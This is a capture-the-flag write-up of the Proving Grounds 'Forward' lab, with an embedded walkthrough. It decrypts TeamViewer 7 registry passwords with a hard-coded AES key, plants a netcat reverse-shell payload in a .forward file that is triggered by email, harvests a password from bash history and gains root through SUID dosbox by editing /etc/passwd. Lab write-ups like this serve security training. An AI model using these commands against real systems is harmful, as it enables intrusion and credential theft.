---
title: Forward
parent: Proving Grounds Practice
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Forward]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.165.157
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 05:55 +0900
Nmap scan report for 192.168.165.157
Host is up (0.095s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 32.64 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Forward]
└─$ sudo nmap -Pn -p22,25,139,445 -sSCV -A -oN full_tcp-scan.txt --open 192.168.165.157
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 05:57 +0900
Nmap scan report for 192.168.165.157
Host is up (0.094s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp  open  smtp        Exim smtpd
| smtp-commands: forward Hello nmap.scanme.org [192.168.45.204], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: FORWARD; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-06-12T20:57:31
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: forward
|   NetBIOS computer name: FORWARD\x00
|   Domain name: \x00
|   FQDN: forward
|_  System time: 2026-06-12T16:57:32-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

TRACEROUTE (using port 25/tcp)
HOP RTT      ADDRESS
1   96.19 ms 192.168.45.1
2   96.14 ms 192.168.45.254
3   96.21 ms 192.168.251.1
4   96.26 ms 192.168.165.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.00 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Forward]
└─$ smbclient -L //192.168.165.157/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        utils           Disk      Utilities
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            OGDOAD
```

```zsh

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Forward]
└─$ cat alberobello.reg          
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7]
"Always_Online"=dword:00000000
"ClientIC"=dword:0705f05b
"ClientID"=dword:29d9846d
"CUse"=dword:00000001
"InstallationDate"="2020-12-16"
"InstallationDirectory"="C:\\Program Files (x86)\\TeamViewer\\Version7"
"LastMACUsed"=hex(7):00,00,00,00,00,00
"LastUpdateCheck"=dword:5fda2de5
"MIDInitiativeGUID"="{2936d53d-fd4b-4cbc-ad55-dc105e3c4220}"
"MIDVersion"=dword:00000001
"PK"=hex:ad,26,ac,2c,bf,bd,68,3c,ce,cb,30,48,b8,ac,94,29,dd,60,df,41,c8,0e,43,\
  a7,6a,08,4e,c1,27,23,65,f4,eb,56,d9,48,ef,e4,e3,fc,6c,b5,33,7e,c6,fa,aa,dd,\
  9a,32,58,c4,b4,97,c4,e6,40,75,5c,bd,77,39,d7,be,16,12,98,e5,94,58,2a,d4,d3,\
  80,68,48,a4,e9,67,1e,83,03,78,fa,6c,9c,48,63,b3,25,04,73,47,fd,2c,ce,82,11,\
  6f,ae,f7,b7,b1,21,96,a6,5a,77,5f,61,6e,34,e8,fe,62,db,b4,94,72,d9,09,19,63,\
  14,a3,46,c7,c1,20,4d,36,aa,ff,f5,e6,58,62,40,7e,51,63,db,a3,91,f9,1e,9c,ff,\
  19,72,58,0f,11,da,da,c5,ef,00,19,53,ae,28,5c,4c,7f,c8,47,dc,e1,d4,f5,a8,3c,\
  91,14,05,f2,57,50,57,78,1f,ea,68,de,d6,ed,5a,e0,ab,88,2c,73,0f,71,12,41,60,\
  90,9d,12,0e,d5,9c,47,c7,d7,d6,f3,44,a2,2e,8a,7f,f7,70,56,43,91,e7,3a,95,1f,\
  24,15,76,ab,3b,26,98,77,10,d6,a5,cd,9d,e2,2e,55,21,4e,81,1a,e7,62,73,5b,8e,\
  14,55,37,dd,58,95,fa,ba,2d,a5,e5,25,3e,78,8e,04,54,9d,b1,2d,89,56,05,81,9f,\
  6d,4b,3c,b3,01,cb,c6,db,8f,4d,7f,56,4b,76,5f,74,20,f4,b5,c6,3f,e7,18,8e,dd,\
  8c,85,eb,bb,d3,3e,1e,aa,98,f8,37,db,d9,85,6f,8b,5c,fa,f2,39,db,a8,86,89,4c,\
  06,af,55,4b,c8,11,f2,f0,fa,fd,b2,fc,02,b2,10,16,70,78,03,12,b4,dd,2a,a2,fc,\
  4e,7b,3e,b3,71,d4,de,21,d9,c4,e9,73,f2,58,7b,38,cf,c4,68,e6,a2,16,ca,6d,f3,\
  f6,5b,84,3a,a3,69,2b,b0,13,ec,2a,5e,23,f6,69,6e,bf,6a,a2,db,1e,08,fc,76,c6,\
  4c,63,98,cf,73,fb,e2,94,1c,94,79,16,76,1e,5c,f8,82,3c,32,fd,5e,52,77,77,0e,\
  53,89,d0,d2,98,58,96,83,4d,64,5c,69,fc,68,43,35,f3,32,57,c7,1f,3d,27,e0,57,\
  af,35,7c,4b,fa,70,39,52,8c,76,aa,3c,6d,02,46,88,d2,ee,e4,1c,3f,20,a0,da,1b,\
  7c,75,1d,d6,ed,1a,b4,5a,65,af,49,c0,52,74,36,ef,0c,10,2a,c6,fa,66,9a,7e,da,\
  08,9c,87,dc,30,5c,46,5d,17,5b,a5,39,ce,d4,d3,95,e1,21,57,86,9c,57,47,e3,45,\
  30,91,1b,d0,8b,85,71,75,cf,9b,24,c9,9c,eb,25,2a,e9,a4,78,4d,9e,f6,a4,34,84,\
  fb,ba,8b,87,50,6f,bf,37,77,3d,a3,17,13,12,5f,48,1f,a4,21,aa,f0,10,7e,6c,2a,\
  42,f4,57,e4,00,88,ad,38,0c,83,bb,3c,71,ec,04,e5,ba,27,2d,b4,f7,46,d2,67,1e,\
  79,e4,e7,e5,b2,63,ff,0f,df,ab,04,26,4f,18,6e,4c,a1,31,80,5b,9d,63,21,76,b0,\
  50,13,6c,81,9f,ce,06,80,80,e3,0b,6f,6b,ef,13,5d,ae
"Security_ActivateDirectIn"=dword:00000000
"SecurityPasswordAES"=hex:b2,21,47,c7,58,c4,f3,9a,6d,bc,84,44,f2,45,58,c2,cf,\
  b5,44,a5,3b,94,74,a0,a2,d0,ea,21,b1,e1,3c,09
"SK"=hex:bf,ad,2a,ed,b6,c8,9a,e0,a0,fd,05,01,a0,c5,b9,a5,c0,d9,57,a4,cc,57,c1,\
  88,4c,84,b6,87,3e,a0,3c,06,ba,da,75,01,cc,a7,c6,d3,0f,07,19,55,48,0f,e3,14,\
  2b,4c,76,21,8b,33,0e,23,0f,b3,16,2d,a8,4c,25,35,a7,44,ac,cb,f1,45,1b,0b,ea,\
  58,ff,45,2e,84,d6,5c,ba,7f,8e,a2,6f,a1,dc,b2,e2,c8,7b,0b,53,44,fd,39,99,7d,\
  61,12,ce,37,9c,da,55,ea,d8,5e,ed,77,83,89,aa,83,3b,54,52,6f,6e,ca,3d,51,18,\
  d8,6c,75,8d,72,6b,8c,d7,1c,d1,ec,84,b6,ce,9f,eb,cd,13,9e,37,e9,0a,c3,11,7d,\
  b2,60,42,76,6e,6b,d3,15,da,73,2a,be,36,55,60,db,b8,e9,cf,31,03,de,d4,32,bc,\
  84,fa,0c,32,ea,05,aa,65,cc,c7,d1,08,52,64,99,4c,0f,ae,57,b4,6d,8b,11,b7,f0,\
  15,33,88,c4,6a,ae,07,11,8c,11,74,35,d7,40,a0,55,c8,d4,5f,24,d1,a8,d5,8a,75,\
  91,e3,c3,ef,4a,f2,2b,ed,be,e9,d4,d9,0a,6a,7f,39,e0,63,4c,4f,fd,58,41,02,7a,\
  6c,52,4d,d5,0a,41,05,55,81,bd,90,44,e9,38,e3,04,6b,ee,c1,9c,a0,80,79,29,2b,\
  b0,b7,f1,75,2c,8a,1d,ba,0c,55,fa,94,77,33,59,db,3d,67,8a,39,5a,48,b3,3a,25,\
  fd,5f,c5,49,2e,c6,3f,91,bd,4e,84,78,db,cc,42,b9,f6,43,de,bb,2b,0c,70,f0,77,\
  d6,ac,a1,02,54,41,06,42,db,d7,9c,72,bb,44,62,5c,c7,93,5a,9f,0b,63,8e,17,1c,\
  cb,28,d2,5e,2f,85,d9,36,35,91,cc,c5,99,79,5c,13,40,79,26,ae,13,bf,5d,37,ba,\
  d7,fc,a7,43,62,7d,0b,f4,66,8c,e3,44,88,1f,c4,37,54,59,b6,a0,4d,fa,e8,cf,9f,\
  e3,51,bc,df,f7,ce,fa,e8,69,cf,2c,e5,2a,4f,c9,3b,b3,08,7c,5e,3f,7e,6e,05,50,\
  87,81,c4,15,af,ee,07,6d,76,ec,4b,8b,c6,df,0d,8f,fc,5d,7f,9b,95,2d,ff,5b,8a,\
  0f,dd,69,19,7a,00,3c,56,bd,37,72,cd,91,66,fc,d6,0a,b1,f0,7a,9a,3f,6a,16,1e,\
  b6,1f,79,f3,d4,f0,6c,6f,fd,1f,b8,c9,85,4b,10,5d,cc,e5,a2,7e,f9,f7,98,43,ea,\
  a1,ce,3c,99,14,7b,8e,0d,0e,7d,0e,23,94,25,23,59,ec,83,82,21,44,4f,4a,f1,21,\
  8d,9e,5b,84,ce,b3,13,51,65,a6,f8,8b,5a,19,e4,55,1c,15,dc,c1,1e,2d,0d,fe,27,\
  85,c6,cc,0b,5e,5a,9a,65,67,76,48,91,5f,5e,79,e3,44,8c,88,85,c5,c2,d4,6a,be,\
  f2,dc,df,72,33,cb,f3,67,45,21,b0,c4,47,16,86,8e,f7,2c,c1,8c,58,eb,00,cc,2b,\
  11,3e,68,58,64,a9,7e,cd,91,d2,ea,87,46,30,03,54,69,4f,e0,ce,e4,82,b0,a0,03,\
  fb,e4,78,27,8c,10,24,f7,cf,8c,22,e9,77,98,ad,7f,e1
"StartMenuGroup"="TeamViewer 7"
"UsageEnvironmentBackup"=dword:00000002
"Version"="7.0.43148"

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\AccessControl]
"AC_Server_AccessControlType"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\DefaultSettings]
"Autostart_GUI"=dword:00000000
```

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Forward/utils]
└─$ ll
total 4984
-rw-r--r-- 1 kali kali   10206 Jun 11 06:08 alberobello.reg
-rw-r--r-- 1 kali kali   10634 Jun 11 06:08 fox.reg
-rw-r--r-- 1 kali kali   10312 Jun 11 06:08 giammy.reg
-rw-r--r-- 1 kali kali   10206 Jun 11 06:08 golemitratigunda.reg
-rw-r--r-- 1 kali kali   10408 Jun 11 06:08 mara.reg
-rw-r--r-- 1 kali kali     165 Jun 11 06:08 README.all
-rw-r--r-- 1 kali kali 5024832 Jun 11 06:08 TeamViewer_Setup_v7.exe
-rw-r--r-- 1 kali kali   10206 Jun 11 06:08 vale.reg

```

```zsh
┌──(venv)─(kali㉿kali)-[~/CTF/OffSec/Practice/Forward]
└─$ python3 tdec.py          
00000000: 69 00 70 00 61 00 72 00  61 00 6C 00 69 00 70 00  i.p.a.r.a.l.i.p.
00000010: 6F 00 6D 00 65 00 6E 00  69 00 64 00 65 00 6C 00  o.m.e.n.i.d.e.l.
00000020: 6C 00 61 00 62 00 61 00  74 00 72 00 61 00 63 00  l.a.b.a.t.r.a.c.
00000030: 6F 00 6D 00 69 00 6F 00  6D 00 61 00 63 00 68 00  o.m.i.o.m.a.c.h.
00000040: 69 00 61 00 00 00 00 00  00 00 00 00 00 00 00 00  i.a.............
None
iparalipomenidellabatracomiomachia

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Exploitation Guide for Forward
Summary
We'll decrypt a password discovered in an SMB share and access a user home directory leveraging the password and SMB. We'll then put a malicious file and trigger the file by sending an email to the user to obtain a shell. We will discover dosbox has SUID permissions and overwrite the passwd to obtain root.

Enumeration
We'll begin with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.135 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 15:46 EDT
Nmap scan report for 192.168.120.135
Host is up (0.047s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
...
Let’s focus on SMB.

Anonymous SMB Enumeration
We can try to connect as anonymous and list the shares.

┌──(kali㉿kali)-[~]
└─$ smbclient -L 192.168.120.135  -U " "%" "

        Sharename       Type      Comment
        ---------       ----      -------
        utils           Disk      Utilities
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
...
utils share is not default. Let’s begin enumerating the contents.

┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.135\\utils -U " "%" "
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Dec 18 03:26:48 2020
  ..                                  D        0  Fri Dec 18 02:48:44 2020
  fox.reg                             N    10634  Fri Dec 18 02:48:44 2020
  TeamViewer_Setup_v7.exe             N  5024832  Fri Dec 18 02:48:44 2020
  mara.reg                            N    10408  Fri Dec 18 02:48:44 2020
  vale.reg                            N    10206  Fri Dec 18 02:48:44 2020
  golemitratigunda.reg                N    10206  Fri Dec 18 02:48:44 2020
  alberobello.reg                     N    10206  Fri Dec 18 02:48:44 2020
  giammy.reg                          N    10312  Fri Dec 18 02:48:44 2020
  README.all                          N      165  Fri Dec 18 02:53:55 2020

                14384136 blocks of size 1024. 11598132 blocks available
smb: \> get README.all
getting file \README.all of size 165 as README.all (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~]
└─$ cat README.all
each of you has to install TeamViewer and then import your own registry key for automatic configuration.
Don't worry about the password, it's well encrypted!

Root!

┌──(kali㉿kali)-[~]
└─$
We discover Windows registry files, potential usernames and a README.all file. Viewing the contents of README.all, we are told the files are TeamViewer registry keys containing encrypted password.

Exploitation
Constructing the Script
TeamViewer version 7 registry files store user passwords encrypted with AES-128-CBC with the key of 0602000000a400005253413100040000 and IV (Initialization vector) of 0100010067244F436E6762F25EA8D704. Using this information we will write our own script supplying the Key, IV and the Hex Cipher String. Source

Let's retrieve fox.reg and output the Hex Cipher String.

┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.135\\utils -U " "%" "
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Dec 18 03:26:48 2020
  ..                                  D        0  Fri Dec 18 02:48:44 2020
  fox.reg                             N    10634  Fri Dec 18 02:48:44 2020
  TeamViewer_Setup_v7.exe             N  5024832  Fri Dec 18 02:48:44 2020
  mara.reg                            N    10408  Fri Dec 18 02:48:44 2020
  vale.reg                            N    10206  Fri Dec 18 02:48:44 2020
  golemitratigunda.reg                N    10206  Fri Dec 18 02:48:44 2020
  alberobello.reg                     N    10206  Fri Dec 18 02:48:44 2020
  giammy.reg                          N    10312  Fri Dec 18 02:48:44 2020
  README.all                          N      165  Fri Dec 18 02:53:55 2020

                14384136 blocks of size 1024. 11598132 blocks available
smb: \> get fox.reg
getting file \fox.reg of size 10634 as fox.reg (67.4 KiloBytes/sec) (average 67.4 KiloBytes/sec)
smb: \> exit
```

```
┌──(kali㉿kali)-[~]
└─$ cat fox.reg  | tr -d '\000' | grep -A 3 'SecurityPasswordAES'
"SecurityPasswordAES"=hex:2c,0f,ff,76,ca,03,d7,c2,1c,0d,3c,8b,55,ed,d8,de,37,\
  f8,97,20,ae,6e,d3,82,d0,ad,2e,70,f9,7e,ff,ea,0b,0c,1c,d9,01,cb,d1,ad,90,fc,\
  60,1b,9e,40,fc,9c,4b,af,65,ee,c5,19,62,eb,4e,da,cc,7c,30,a8,a6,6b,0c,bd,9f,\
  36,2a,c0,ca,d1,59,89,04,ae,cb,8b,96,10
...
```

```
Next, we'll add all the values into our decrypt script.

tdec.py

import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

# Hex Cipher String
hex_str_cipher = "2C0FFF76CA03D7C21C0D3C8B55EDD8DE37F89720AE6ED382D0AD2E70F97EFFEA0B0C1CD901CBD1AD90FC601B9E40FC9C4BAF65EEC51962EB4EDACC7C30A8A66B0CBD9F362AC0CAD1598904AECB8B9610"

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

```zsh
┌──(kali㉿kali)-[~]
└─$ python3 tdec.py
00000000: 69 00 70 00 61 00 72 00  61 00 6C 00 69 00 70 00  i.p.a.r.a.l.i.p.
00000010: 6F 00 6D 00 65 00 6E 00  69 00 64 00 65 00 6C 00  o.m.e.n.i.d.e.l.
00000020: 6C 00 61 00 62 00 61 00  74 00 72 00 61 00 63 00  l.a.b.a.t.r.a.c.
00000030: 6F 00 6D 00 69 00 6F 00  6D 00 61 00 63 00 68 00  o.m.i.o.m.a.c.h.
00000040: 69 00 61 00 00 00 00 00  00 00 00 00 00 00 00 00  i.a.............
None
iparalipomenidellabatracomiomachia
```

iparalipomenidellabatracomiomachia

```zsh
SMB User Access
Attempting the credentials fox:iparalipomenidellabatracomiomachia on SSH with no luck but we do have a valid login for SMB.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ smbclient -L  192.168.120.135  -U "fox%iparalipomenidellabatracomiomachia"

        Sharename       Type      Comment
        ---------       ----      -------
        utils           Disk      Utilities
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
        fox             Disk      Home Directories
SMB1 disabled -- no workgroup available
```

```zsh
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.135\\fox -U "fox%iparalipomenidellabatracomiomachia"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  8 13:04:12 2021
  ..                                  D        0  Fri Jan  8 13:04:11 2021
  .bashrc                             H     3526  Fri Dec 18 02:48:44 2020
  .bash_history                       H        0  Fri Aug  6 11:56:33 2021
  .profile                            H      807  Fri Dec 18 02:48:44 2020
  local.txt                           N       33  Fri Jan  8 13:04:12 2021
  .bash_logout                        H      220  Fri Dec 18 02:48:44 2020
  .forward                            H       26  Fri Dec 18 02:48:44 2020

                14384136 blocks of size 1024. 11598128 blocks available
smb: \> get .forward
getting file \.forward of size 26 as .forward (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

```zsh
┌──(kali㉿kali)-[~]
└─$ cat .forward
"| /usr/bin/procmail -f-"

┌──(kali㉿kali)-[~]
└─$
Remote Code Execution
.forward files can be used to redirect mail or send mail. The file pipes directly into /usr/bin/procmail which might allow us to replace the file with our payload and have it triggered by sending mail via port 25 to fox; therefore, achieving Remote Code Execution.

┌──(kali㉿kali)-[~]
└─$ echo "|nc 192.168.118.11 9001 -e /bin/bash" > .forward

┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.135\\fox -U "fox%iparalipomenidellabatracomiomachia"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  8 13:04:12 2021
  ..                                  D        0  Fri Jan  8 13:04:11 2021
  .bashrc                             H     3526  Fri Dec 18 02:48:44 2020
  .bash_history                       H        0  Fri Aug  6 11:56:33 2021
  .profile                            H      807  Fri Dec 18 02:48:44 2020
  local.txt                           N       33  Fri Jan  8 13:04:12 2021
  .bash_logout                        H      220  Fri Dec 18 02:48:44 2020
  .forward                            H       26  Fri Dec 18 02:48:44 2020

                14384136 blocks of size 1024. 11598128 blocks available
smb: \> put .forward
putting file .forward as \.forward (0.3 kb/s) (average 0.3 kb/s)
smb: \> exit

┌──(kali㉿kali)-[~]
└─$ nc 192.168.120.135 25
220 forward ESMTP Exim 4.92 Mon, 09 Aug 2021 17:22:11 -0400
helo ciao
250 forward Hello ciao [192.168.118.11]
mail from:<fox@localhost>
250 OK
rcpt to:<fox@localhost>
250 Accepted
data
354 Enter message, ending with "." on a line by itself
ciao
.
250 OK id=1mDCjM-0001KV-Rr
quit
221 forward closing connection

┌──(kali㉿kali)-[~]
└─$
We'll receive our shell.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.135] 46666
id
uid=1000(fox) gid=100(users) groups=100(users)
Escalation
Obtaining SSH access
While enumerating we discover /home/mara/.bash_history contains a password for fox, which allows us access via SSH.

fox@forward:~$ find / -name .bash_history 2>/dev/null
find / -name .bash_history 2>/dev/null
/home/mara/.bash_history
/home/fox/.bash_history
fox@forward:~$ cat /home/mara/.bash_history
cat /home/mara/.bash_history
sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191
fox@forward:~$
```

```
┌──(kali㉿kali)-[~]
└─$ ssh fox@192.168.120.135
fox@192.168.120.135's password:
Linux forward 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1000(fox) gid=100(users) groups=100(users)
$
DOSBox
While enumerating for SUID binaries, we find /usr/bin/dosbox a MS-DOS emulator.
```

```
fox@forward:~$ find / -perm -4000 2> /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/procmail
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/dosbox
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
DOSBox runs in an X11 environment which will require X11Forwarding via SSH using the -X option.
```
![](../../../assets/images/Pasted%20image%2020260613065255.png)

```
ssh -X fox@192.168.120.135
dosbox
We'll overwrite the /etc/passwd file with our own entry.<br />

Target machine:

fox@forward:~$ echo 'superroot:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > fkpasswd
fox@forward:~$
DOSBox:

```
![](../../../assets/images/Pasted%20image%2020260613064812.png)

```sh
mount d /
D:
type D:\HOME\FOX\FKPASSWD >> D:\ETC\PASSWD
Root Shell
superroot:toor

fox@forward:~$ su - superroot
Password:
root@forward:~# id
uid=0(root) gid=0(root) groups=0(root)
root@forward:~#
We have root!
```

</details>